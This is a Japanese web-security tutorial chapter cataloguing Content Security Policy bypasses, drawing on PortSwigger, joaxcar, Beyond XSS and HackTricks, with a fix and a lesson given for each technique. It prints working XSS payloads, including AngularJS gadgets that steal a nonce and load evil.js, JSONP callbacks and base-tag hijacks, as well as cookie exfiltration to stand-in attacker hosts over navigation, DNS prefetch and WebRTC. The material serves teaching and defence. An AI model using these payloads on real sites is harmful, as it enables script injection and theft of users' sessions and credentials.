#### 防御策

Truesecが強調する対策は次の3点に集約されます。

1. **根本原因の修正を優先する**: CSPはあくまで多層防御の一枚であり、根本的にはユーザー制御下のデータを挿入先のコンテキスト（HTML本文・属性値・URL・JavaScript文字列など）に応じて正しくエンコード／エスケープすることが必須です。
2. **secure-by-defaultなフレームワークを使う**: Angularの`trustAsHtml`やReactの`dangerouslySetInnerHTML`のような「危険であることが名前からも分かる」APIを避け、フレームワークが標準で提供する自動エスケープ機構に乗ること。
3. **CSPを唯一の防御層にしない**: 「CSPはバイパスされうる」という前提に立ち、脆弱性そのものの修正、入力サニタイズ、出力エンコーディングと組み合わせた多層防御を行うこと。

### PortSwiggerの実例：動的解析でnonceベースCSPを崩す

もう一つの実例は、PortSwigger Researchが自社サイト（portswigger.net）で実際に発見した、nonceベースCSPのバイパスです。これは「Burp Scannerの動的解析（Dynamic Analysis）」がどのように実際のCSPバイパスを自動検出したかというケーススタディでもあります。

> 出典: Hunting nonce-based CSP bypasses with dynamic analysis — https://portswigger.net/research/hunting-nonce-based-csp-bypasses-with-dynamic-analysis （公開日: 2021年9月17日）

#### nonceベースCSPが想定している保護

nonceベースCSPとは、ページを描画するたびにサーバー側でランダムな一回限りのトークン（nonce）を生成し、レスポンスヘッダーとHTML中の`<script>`タグの両方に埋め込む方式です。

```
Content-Security-Policy: script-src 'nonce-r4nd0m123' 'strict-dynamic';
```

```html
<script nonce="r4nd0m123">/* 正規スクリプト */</script>
```

ブラウザは、実行しようとしているスクリプト要素の`nonce`属性値がCSPヘッダーで宣言された値と一致する場合のみ実行を許可します。攻撃者はレスポンスのたびに変わるこのトークンの値を事前に知ることができないため、HTMLインジェクションで`<script>`タグを注入しても、正しい`nonce`値を付与できず実行がブロックされる——というのが設計上の想定です。

さらに`'strict-dynamic'`というキーワードが付与されている場合、挙動が一段複雑になります。これは「nonceで信任されたスクリプトが、実行中に動的に生成・挿入した新しいスクリプト」については、その新しいスクリプト自身にnonceが付いていなくても信頼を引き継いで実行してよい、というルールです。これは正規のSPAフレームワークなどが実行時に`document.createElement('script')`で追加のコードを読み込む挙動を壊さないための救済措置ですが、裏を返せば「**nonceで信任された既存スクリプトの内部ロジックさえ乗っ取れれば、そこから生成される新しいスクリプトはnonceなしで実行できてしまう**」という、CSPにおける典型的なスクリプトガジェットの温床になります。

#### 発見された脆弱なコード

PortSwiggerの記事によれば、Burp Scannerの動的解析エンジンが、あるページ上のJavaScriptで「input要素の値がscriptタグのURLをコントロールしている」パターンを自動的に検出しました。該当する（サイト自身が読み込んでいた）正規のJavaScriptはおおむね次のような処理でした。

```javascript
var t = document.querySelector("[id^='RecaptchaClientUrl-']").value,
    i = document.querySelector("[id^='RecaptchaClientSecret-']").value,
    n = document.createElement("script");
n.id = "RecaptchaScript";
n.src = t + i;
```

これはGoogle reCAPTCHA連携用のスクリプトを動的に読み込むための、ごく普通に見えるコードです。`id`が`RecaptchaClientUrl-`から始まる要素の`value`を読み取り、それを新しく作った`<script>`要素の`src`に組み立てて挿入しています。ここでの`querySelector`は、**CSSセレクタにマッチする最初の1要素だけ**を返す仕様であることが決定的な弱点になります。

#### 攻撃：DOM Clobberingでガジェットの入力を乗っ取る

もしページ上のどこかに攻撃者がHTMLを注入できる場所（たとえ小さなHTMLインジェクションであっても）があれば、次のような要素を、正規の`RecaptchaClientUrl-...`という`id`を持つ本物の要素より**DOM上で先に**出現するように注入します。

```html
<input id="RecaptchaClientUrl-" value="//portswigger-labs.net/xss/xss.js">
```

先に説明した正規コードが実行されるとき、`document.querySelector("[id^='RecaptchaClientUrl-']")`はDOM順で最初にマッチした要素、つまり攻撃者が注入したこの`<input>`を返します。結果として`n.src`には攻撃者が完全に制御する外部URL（`//portswigger-labs.net/xss/xss.js`）が代入され、`document.head`などに追加された時点でそのスクリプトが読み込まれ、実行されます。

ここで見落としてはならないのは、**この`<script>`要素には`nonce`属性が一切付与されていない**という点です。それでもブロックされずに実行されたのは、この`<script>`要素自体が「nonceで信任済みの正規スクリプト（reCAPTCHA連携コード）」によって動的に生成・挿入されたものであり、CSPポリシーに`'strict-dynamic'`が含まれていたためです。`'strict-dynamic'`のルールにより、信任されたスクリプトが生成した子スクリプトは、URLのホワイトリストチェックもnonceチェックも受けずに実行を許可されます。つまりこの攻撃は、

1. HTMLインジェクションで属性を上書きする**DOM Clobbering**（正規コードが参照するはずの要素を、攻撃者が用意した別の要素で「かぶせて」乗っ取るテクニック）と、
2. `querySelector`が「最初の一致」しか見ないという仕様、
3. `'strict-dynamic'`が動的生成スクリプトへの信頼を継承する仕様

という3つの要素が組み合わさって成立する、教科書的なスクリプトガジェット攻撃です。攻撃者は一切新しいJavaScriptコードそのものを注入していません。注入したのは単なる`<input>`要素であり、実際に悪意あるスクリプトを`document.head`に挿入して実行したのは、サイト自身が書いた正規のreCAPTCHA連携コードです。

#### 発見手法：Burp Scannerの動的解析

この脆弱性は人間の目視によるコードレビューではなく、**Burp Scannerの動的解析（Dynamic Analysis）**によって自動的にフラグが立てられました。記事の言葉を借りれば「Burp scanner had spotted that the value of an input element was being used to control a script URL」——つまりスキャナーは、ページの実行をブラウザエンジン上で追跡し、「input要素の値がスクリプトのURL生成に流れ込んでいる」というデータフローそのものを検出したということです。これは静的なパターンマッチ（正規表現でペイロード文字列を探す）ではなく、実際にDOM操作の結果を動的に観測して「攻撃者が制御可能な値が、危険なシンク（この場合はscriptのsrc生成）に到達するか」を追跡する手法であり、スクリプトガジェットのようにペイロード自体が単純な入力データにしか見えないケースの発見に強みを持ちます。

#### 修正・教訓

記事が示す推奨修正は非常にシンプルです。

> "The best fix for this issue is to avoid giving an attacker control over the URL, so specifying a static string to the script's location would prevent this issue."（この問題への最良の修正は、攻撃者にURLの制御権を与えないことである。スクリプトの読み込み先を静的な文字列として直接指定すれば、この問題は防止できる。）

つまり、そもそも「DOMから動的に値を読み取ってスクリプトのURLを組み立てる」という設計自体をやめ、スクリプトのURLをコード内にハードコードすべきだった、ということです。PortSwiggerはこの報告を受けてCSP設定・該当コードを修正しました。

この事例が示す教訓は明確です。

- **nonceや`'strict-dynamic'`があっても、正規スクリプトの内部ロジックが「攻撃者が影響できるDOM値」から実行対象を決定していれば、そこがガジェットになる**。
- **DOM Clobbering（同じidを持つ要素をすり替える、あるいは先に出現させる）は、`querySelector`・`getElementById`のように「最初の一致」を返すAPIと組み合わさると特に危険**。CSPそのものをすり抜けるだけでなく、DOM上の変数参照を書き換えてロジック全体を乗っ取る手段として広く応用が利く。
- **重要な脆弱性は自動化されたツール（動的解析）によっても発見できる**。ペイロードの見た目が「ただのHTMLインジェクション」であっても、その先に危険なシンクへ到達するデータフローがあるかどうかを実行時に追跡することが有効。

### まとめ：CSPは万能ではない

TruesecとPortSwiggerの2つの実例は、まったく異なるメカニズム（HTMLコメントの脱出 vs DOM Clobbering + strict-dynamic）を使っていますが、共通する本質は同じです。**CSPは「新しく持ち込まれた不正なスクリプト」を防ぐことには強い一方、「もとから許可されている正規スクリプトが、汚染されたデータをもとに危険な処理を代行してしまう」ケースには無力**だということです。これは`unsafe-eval`やインラインスクリプトを禁止するような厳格な設定であっても変わりません。

実務上の教訓として、CSPを導入する際は次の点を意識すべきです。

- ホワイトリストに載せるライブラリやCDNは、それ自体がガジェット（DOM操作を汚染データから行う処理）を持たないか検討する。特にjQuery系・テンプレートエンジン系・古いUIウィジェットライブラリは要注意。
- `'strict-dynamic'`を使う場合、動的に生成されるスクリプトの`src`やコンテンツが、いかなる経路であってもユーザー制御下のDOM値から組み立てられていないかを確認する。
- `querySelector`・`getElementById`・`window`のグローバル変数参照など、「複数の要素が同じ名前・IDを持ちうる」箇所は、DOM Clobberingの被害を受けやすい設計になっていないか点検する。
- CSPはあくまで多層防御の一部と位置づけ、根本的な出力エンコーディングや入力バリデーションを省略しない。

CSPバイパスの発見は年々、こうした「地味なガジェット探し」にシフトしています。ペイロードそのものより、「このサイトにはどんな正規スクリプトが動いていて、それはどんなDOM値を信用しているか」を読み解く力が、CSP環境下でのXSS発見において最も重要なスキルになります。

---

## CSPバイパス総まとめ（joaxcar / Beyond XSS / HackTricks）

CSP（Content Security Policy、コンテンツセキュリティポリシー）は「ブラウザ側で強制されるホワイトリスト型の実行制御機構」で、XSS（クロスサイトスクリプティング）が成立した後の**最後の防波堤**として機能する。素朴な反射型XSSを理解した読者が次に踏み込むべきなのが、この防波堤をどう突破するか、そもそも突破しなくても情報が漏れてしまうケースがあるという事実である。本節では、実際のバグバウンティ報告（joaxcar による portswigger.net のバイパス）、体系的な解説教材（Beyond XSS）、実務リファレンス（HackTricks）という3つの視点から、CSPバイパスのカタログを整理する。

隣接する節との棲み分けを先に述べておく。CSPが構造的になぜ破れやすいのかという理論（Googleの "CSP Is Dead" 論文と `strict-dynamic`）は **s4i**、スクリプトガジェット／コード再利用による「CSP違反ゼロでの任意コード実行」の実例（Truesec・PortSwigger nonce）は **s4l** で扱った。本節はそれらを踏まえたうえで、実戦で使う**バイパス手法そのものの網羅的カタログ**を提供する。

### 前提：CSPの照合ロジックを一段深く理解する

CSPは `Content-Security-Policy` レスポンスヘッダ（または `<meta http-equiv="Content-Security-Policy">`）で配信され、`script-src`, `default-src`, `object-src`, `base-uri`, `form-action`, `connect-src` などの**ディレクティブ**ごとに「どこから」「どうやって」リソースを読み込んでよいかを宣言する。ブラウザはHTMLパーサがDOMを構築する過程で、スクリプトを実行しようとするたびに、その取得元URLやインラインかどうかを対応ディレクティブの**ソースリスト**と照合し、一致しなければブロックする。

ソースリストで使われる主なキーワードの意味は次の通り。バイパスはこの一つ一つの「解釈の隙間」を突くので、正確に押さえておく。

| キーワード | 意味 | 注意点（＝攻撃の入口になりやすい理由） |
|---|---|---|
| `'self'` | 同一オリジンのリソースのみ許可 | サイト内にファイルアップロードやJSONPがあると自爆する |
| `'unsafe-inline'` | インライン `<script>`・イベントハンドラを許可 | これがあると事実上XSS防御は無い |
| `'unsafe-eval'` | `eval()` / `Function()` 等を許可 | ライブラリのテンプレート評価が着火点になる |
| `'nonce-xxxx'` | 指定した乱数トークンを持つインラインスクリプトのみ許可 | `strict-dynamic` が無いとホワイトリスト頼みに戻る |
| `'strict-dynamic'` | nonce/hashで信頼されたスクリプトが動的に読み込む子スクリプトも信頼する。**ホスト名ホワイトリストを無効化する** | 正しく使えば強力だが、旧ブラウザ用フォールバックが緩いと台無し |
| `'unsafe-hashes'` | 特定のインラインイベントハンドラをハッシュで許可 | ガジェット経由の悪用余地 |
| `data:` | `data:` URIからの読み込みを許可 | `data:text/javascript,...` を直接注入できる |
| `blob:` | `blob:` URLを許可 | JSで生成したBlobを実行できる |
| `*` | data:/blob:/filesystem: 以外の全URLを許可 | 実質ホワイトリスト無効化 |

**CSPバイパスとは、この照合ロジックの「抜け（設定漏れ）」や「解釈のズレ（パーサ差異・リダイレクト）」を突いて、ポリシーが本来許可しないはずの挙動を実行させる技術群**である。重要な洞察は、バイパスの多くが「攻撃コードの巧妙さ」ではなく、「許可リストに載っている“信頼済み”ドメインの中に、攻撃者が乗っ取れる機能（JSONPエンドポイント、AngularJS、オープンリダイレクト）が存在する」という運用上の見落としを突くという点にある。

---

### 資料1：joaxcar — Googleスクリプトリソースによる portswigger.net のCSPバイパス（2024年）

Johan Carlsson（joaxcar）は2024年2月、CSPで守られた **portswigger.net 本体**（PortSwigger社の公式サイト）で、nonceベースのCSPを完全にバイパスして任意スクリプト実行に至った事例を報告した。これは「nonceがあってもホワイトリスト依存だと破れる」という s4i/s4l の理論を、標的が防御側のプロ企業自身であるという象徴的な形で実証したケースである。

#### 弱点の構図：nonce + ホワイトリスト、ただし `strict-dynamic` なし

portswigger.net のCSPは、インラインスクリプトを `nonce` で制御しつつ、reCAPTCHA のために Google のスクリプトリソース（`https://www.google.com/recaptcha` と `https://www.gstatic.com/recaptcha`）をホスト名で**ホワイトリスト**していた。ここに `'strict-dynamic'` が付いていなかったことが致命的だった。`strict-dynamic` が無いnonce CSPでは、**ホワイトリストされたホストのURLはnonceが無くても読み込めてしまう**。つまりnonceで固めたつもりでも、実質は「Googleのリソースなら何でも許可」の状態に戻っていた。

そしてGoogleが reCAPTCHA と一緒に配信していたバンドルの中には、**AngularJS が含まれていた**。AngularJSは「CSPの定番ブレーカー（classic CSP breaker）」と呼ばれ、ページに読み込ませるだけで、Angularのテンプレート式評価を通じてサンドボックス外のJSを実行できてしまうことで知られる。

#### ステップ1：Angularガジェットで最初のJS実行を得る

まず、ホワイトリストされたGoogleドメインからAngularJS入りのスクリプトを読み込み、Angularのディレクティブ（`ng-on-error` などのイベント式）を使って初弾のコード実行を起こす。

```html
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
```

**なぜ動くか**：`<script src=...>` はホワイトリスト済みホストなのでCSPを通る。読み込まれたバンドルにAngularJSが含まれるため、ページ内のAngularディレクティブ（`ng-on-error`）が有効化される。`<img src=x>` は読み込みに失敗して `error` イベントを発火し、その式 `$event.target.ownerDocument.defaultView.alert(1)` がAngularの式エバリュエータで評価される。式はインラインスクリプトではなく「属性値の中の文字列」なので、`script-src 'nonce-...'` のインライン判定に引っかからない。これがAngularをCSPブレーカーたらしめる核心である。

#### ステップ2：nonceを盗み出す

Angular式の中からは通常のDOM APIが使える。CSPのnonceはDevToolsのAttributes表示では隠されるものの、**JavaScriptからは `element.nonce` プロパティで読み取れる**（DOM上の `[nonce]` セレクタでも要素は選択できる）。

```javascript
const nonce = document.querySelector("[nonce]").nonce;
```

**なぜ動くか**：ブラウザはnonce値をHTML属性としては露出しない（属性ゲッターでは空になる）が、IDLプロパティ `HTMLScriptElement.nonce` としてはスクリプトから参照可能なまま残す。この「属性は隠すがプロパティは残す」という設計上の非対称が、同一オリジンで既に走っているスクリプト（ここではAngular経由の攻撃者コード）にとっては抜け穴になる。

#### ステップ3：盗んだnonceで任意スクリプトを注入して昇格

nonceさえ手に入れば、正規のインラインスクリプトになりすまして外部スクリプトを注入できる。`unsafe-eval` が無くても関係ない。

```html
<img src=x ng-on-error='doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```

**なぜ動くか**：新しく作った `<script>` 要素に正規の `nonce` を設定して `body` に追加すると、ブラウザはそのスクリプトを「nonce一致＝許可済み」と判定して実行する。これでホワイトリスト外の任意オリジン（`//example.com/evil.js`）から任意コードを実行でき、部分的なXSSが完全なXSSへ昇格する。

#### 影響・報奨・修正

完全なCSPバイパスにより、限定的なHTMLインジェクションから任意コード実行へ到達した。PortSwiggerはこのCSPバイパスを受理（$1,000）、さらに欠けていた `form-action` ディレクティブも指摘され（$500）、両方を修正した。教訓は明快で、**nonceベースCSPには `'strict-dynamic'` を必ず併用し、ホスト名ホワイトリスト（とりわけAngularJSやJSONPを配りうるGoogle系ドメイン）に依存しない**こと。

> 出典: CSP bypass on portswigger.net using Google script resources — https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/

---

### 資料2：Beyond XSS — CSPバイパスの体系

Huli（@aszx87410）の教材 Beyond XSS のCSP章は、「XSSに対する第二の防衛線」としてのCSPを、`script-src` のソース許可評価という視点から系統立てて解体する。実務でよく効く6つのパターンを、原典のペイロードで示す。

#### (1) 許可ドメインが広すぎる（CDNまるごと許可）

`script-src https://unpkg.com/` のようにCDNのオリジンをまるごと許可すると、そのCDN上に置かれた**悪意あるライブラリ**を読み込めてしまう。

```html
<script src="https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js"></script>
<br csp="alert(1)">
```

**なぜ動くか**：`unpkg.com` はnpmの任意パッケージをそのまま配信する。攻撃者が公開した `csp-bypass` パッケージは、独自属性 `csp="..."` の中身をJS式として評価するミニインタプリタ（`sval`）を含む。CSPは「unpkg.com由来のスクリプト」を許可しているだけなので、その中身が攻撃者製でも通る。**防御**は「パスまで完全指定する」こと。`https://unpkg.com/` ではなく `https://unpkg.com/react@16.7.0/` のようにバージョン付きの厳密なパスを書く。

#### (2) `base-uri` 未指定 → `<base>` タグによる相対パス乗っ取り

nonceで守っていても、`base-uri` を指定していないと `<base>` タグで相対URLの基準を攻撃者サーバに向けられる。

```html
<meta http-equiv="Content-Security-Policy"
  content="default-src 'none'; script-src 'nonce-abc123';">
<base href="https://attacker.com/">
<script nonce=abc123 src="app.js"></script>
```

**なぜ動くか**：`<script src="app.js">` は相対URLなので、解決の基準が `<base href>` に従う。攻撃者が `<base href="https://attacker.com/">` を注入できれば、`app.js` は `https://attacker.com/app.js` から読み込まれる。nonceは一致しているのでCSPは通ってしまう。**防御**は `base-uri 'none'`（または `'self'`）を必ず入れること。

#### (3) 許可ドメイン上のJSONPエンドポイント

ホワイトリストされたドメインに、コールバック名を検証しないJSONPエンドポイントがあると、そのコールバック引数に任意コードを注入できる。

```html
<meta http-equiv="Content-Security-Policy"
  content="script-src https://www.google.com https://www.gstatic.com">
<script src="https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//"></script>
```

サーバは次のようなレスポンスを返す。

```javascript
alert(1);//([{id: 1, name: 'user01'}])
```

**なぜ動くか**：JSONP（JSON with Padding）は「JSONを指定コールバック関数の引数に包んで返す」仕組み。コールバック名 `jsonp=alert(1)//` がそのままレスポンス冒頭に出力され、末尾の `//` で残りのJSONをコメントアウトするため、`alert(1);` という有効なJSが `www.google.com` オリジンから配信される＝CSP的には完全に正規。**防御**はパスを絞る（`https://www.google.com/recaptcha/` など）とともに、許可ドメインをJSONBeeのようなリストで監査し、既知のJSONP穴が無いか確認すること。

#### (4) コールバックが制限されたJSONP → SOME（Same-Origin Method Execution）

コールバック名が英数字とドットに制限されている場合でも、既存のページ機能を鎖状に呼び出す **SOME攻撃** に持ち込める。

```javascript
?callback=document.body.firstElementChild.nextElementSibling.click
```

**なぜ動くか**：任意JSが書けなくても、`a.b.c.method` 形式のメソッド参照は英数字とドットだけで表現できる。JSONPがそれを関数として呼ぶと、ページ上の要素（例：管理操作ボタン）の `click()` などが攻撃者の意図で発火する。WordPressプラグインのインストール攻撃事例として知られる。

#### (5) サーバサイドリダイレクトによるパス制限のすり抜け

CSPの**パス指定はリダイレクト後には再チェックされない**という仕様を突く。

```html
<meta http-equiv="Content-Security-Policy"
  content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
<script src="http://localhost:5555/301"></script>
```

`http://localhost:5555/301` が `https://www.google.com/complete/search?jsonp=alert(1)` へ301リダイレクトすると、CSPは最終URLのパスを検証しないため、JSONP穴のあるパスへ到達できる。**なぜ動くか**：CSPのリダイレクト時のマッチングは「オリジンは見るがパスは見ない」仕様（情報漏洩防止のため、リダイレクト先パスを攻撃者に観測させない設計の副作用）。**防御**はサイトにオープンリダイレクトを残さないこと。

#### (6) 相対パス上書き（RPO）：`%2f` のデコード差

パス制限を、URLエンコードされたスラッシュのデコード差で回避する。

```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```

**なぜ動くか**：ブラウザは `%2f` を「エンコードされた文字」として扱い、パスは表面上 `scripts/react/` 配下に見えるためCSPを通す。ところがサーバ側が `%2f` を `/` にデコードすると、実際には `scripts/react/../angular/angular.js`＝親ディレクトリの `angular/angular.js` が読み込まれる。**防御**はサーバで `%2f` を `/` として正規化しない（デコードしてからのパス解決をしない）こと。

#### (7) 厳格なCSPでも残る情報の持ち出し

`default-src 'none'` でも、以下の経路でデータは外へ出せる（＝CSPはXSSの実行は止めても、情報漏洩の全経路は塞げない）。

- **ナビゲーション**：`window.location = 'https://example.com?q=' + document.cookie`
- **WebRTC**：ICEサーバ設定を通じてSTUN/TURN経由でデータを漏らす
- **DNSプリフェッチ**：`<link rel="dns-prefetch" href="https://<秘密>.example.com">` でサブドメインにデータを載せてDNS問い合わせとして送る

将来的な `navigate-to` / `webrtc` ディレクティブが一部を塞ぐ可能性はあるが、現状はCSP単独では防ぎきれない。Beyond XSS は「完全に問題のないCSPを書くのは難しく、時間をかけて段階的にunsafeな要素を消していく」という漸進的ハードニングを推奨している。

> 出典: Beyond XSS — CSP bypass — https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/

---

### 資料3：HackTricks — CSPバイパス総覧（実務チートシート）

HackTricks のCSPバイパス項は、ペンテスト現場で「与えられたポリシー文字列を見て、どの穴から入るか」を素早く判断するためのカタログである。上の2資料と重なる部分は要点のみとし、追加で重要なものを挙げる。

#### インライン許可・ワイルドカード・スキーム

`'unsafe-inline'` があれば古典的にそのまま通る。

```html
"/><script>alert(1);</script>
```

ワイルドカードや広いスキーム（`script-src 'self' https://google.com https: data *;`）があれば、任意オリジンや `data:` から読み込める。

```html
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```

#### JSONPエンドポイント一覧（許可ドメイン別）

`'self'` に加えてこれらの著名ドメインが許可されていると、既知のJSONP穴でバイパスできる。JSONBee がこうしたエンドポイントをまとめている。

```
https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1
https://accounts.google.com/o/oauth2/revoke?callback=eval(...)
https://ajax.googleapis.com/ajax/services/feed/find?v=1.0&callback=alert
https://www.youtube.com/oembed?callback=alert
```

`ajax.googleapis.com` が許可されていれば、AngularJSを読み込んでガジェット化する定番も使える。

```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
```

#### ファイルアップロード + `'self'`

`script-src 'self'` のサイトに、JSとして解釈されるファイルをアップロードできれば自爆する。

```html
"/>'><script src="/uploads/picture.png.js"></script>
```

拡張子偽装（`.png.js`）やポリグロット、サーバのMIME判定次第で成立する。**同一オリジンにアップロード機能があるなら `'self'` は危険**という教訓。

#### ディレクティブ欠落の悪用

`object-src` も `default-src` も無ければ、`<object>` で `data:` HTMLを実行できる。

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

`base-uri` 欠落は前述の `<base>` 乗っ取りにつながる。

#### ポリシー・インジェクション

アプリがCSP文字列に攻撃者入力を反映してしまう場合、ポリシー自体を書き換える。
- **Chrome**：`script-src-elem *` を注入して制限を上書き（後発ディレクティブが優先される挙動を悪用）。
- **Edge**：`;_` を注入してポリシー全体を壊す（無効化）。

#### 外部通信ゼロでの情報持ち出し

`connect-src` すら無い環境でのデータ漏洩の実物。

```javascript
// DNSプリフェッチにcookieを載せる
var sessionid = document.cookie.split("=")[1];
var body = document.getElementsByTagName("body")[0];
body.innerHTML += '<link rel="dns-prefetch" href="//' + sessionid + 'attacker.ch">'
```

```javascript
// WebRTCのDNS問い合わせで漏らす
p = new RTCPeerConnection({ iceServers: [{ urls: "stun:LEAK.dnsbin" }] });
p.createDataChannel("");
p.setLocalDescription(await p.createOffer())
```

```javascript
// 素朴なナビゲーション
document.location = "https://attacker.com/?" + document.cookie
```

#### PHP実装依存のバイパス

CSPヘッダを `header()` で送る前に出力が始まってしまうとヘッダが付かない、という実装の隙を突く。
- **max_input_vars 超過**：大量のPOST変数を送るとwarningが `header()` 前に出力され、「headers already sent」でCSPヘッダの送出に失敗する。
- **レスポンスバッファ飽和**：4096バイト超のwarning等でバッファを溢れさせ、CSP付与前に本文送信を始めさせる。

#### `form-action` 欠落による資格情報窃取

`form-action` が無いと、反映HTMLに偽ログインフォームを注入できる。ブラウザのパスワードマネージャが自動入力し、既定の `GET` 送信で資格情報がURLに載り、`<meta http-equiv="Refresh">` でクロスオリジンへ飛ばしてReferer経由で漏らす。joaxcarの事例で `form-action` 欠落が別途指摘されたのはこの文脈である。

#### ブックマークレット

CSPは「ページ内で読み込むリソース」を制御するが、ユーザがドラッグ＆ドロップした**ブックマークレット**はページのCSPの外で実行される。ソーシャルエンジニアリングと組み合わせる古典。

#### 分析ツール

- **CSP Evaluator**（Google）: https://csp-evaluator.withgoogle.com/ — ポリシーの弱点を機械診断
- **CSP Validator**: https://cspvalidator.org/
- **csper.io** — 観測リソースから候補ポリシーを生成

> 出典: HackTricks — Content Security Policy (CSP) Bypass — https://book.hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html

---

### 横断まとめ：バイパスを4つの型に分類する

3資料を貫く共通構造を、防御設計に使える形で分類しておく。

1. **許可リストの過剰（設定漏れ型）**：CDNまるごと・`*`・`data:`・`unsafe-inline`/`unsafe-eval`。→ パスまで厳密指定、`'strict-dynamic'` + nonce に移行し、ホスト名ホワイトリストへの依存を捨てる。
2. **信頼済みドメイン内のガジェット（ホワイトリスト裏切り型）**：JSONP、AngularJS、既存ライブラリのテンプレート評価。→ 許可ドメインをCSP Evaluator / JSONBee で監査。Google系（`www.google.com`, `ajax.googleapis.com`, `accounts.google.com`）は特に危険。
3. **パーサ・仕様の解釈差（デコード/リダイレクト型）**：`%2f` のRPO、リダイレクトでのパス無視、`<base>` 乗っ取り、ポリシー・インジェクション。→ `base-uri 'none'`、オープンリダイレクト排除、`%2f` を正規化しない、CSP文字列に入力を反映しない。
4. **実行は防いでも漏洩は防げない（範囲外型）**：`location`、WebRTC、DNSプリフェッチ、`form-action` 欠落による資格情報窃取。→ `connect-src`/`form-action`/`navigate-to` を明示し、CSPを「XSS実行の防止」に限定した防御と割り切って多層で守る。

最重要の実務結論は、`strict-dynamic` を伴うnonceベースCSP（strict CSP、s4i参照）への移行である。ホスト名ホワイトリスト方式は上記1〜3のほぼ全てに晒されるが、strict CSPはホワイトリスト自体を無効化するため、JSONP・AngularJS・RPO・リダイレクトといった「信頼済みドメイン悪用」系のバイパスをまとめて封じられる。joaxcarのportswigger.net事例は、まさに `strict-dynamic` の欠落が全ての引き金だったことを示している。

---

（前章: [第3章 DOMベースXSS](./03-dom-xss.md)　｜　次章: [第5章 フレームワーク固有のXSS](./05-frameworks.md)　｜　[目次](./README.md)）
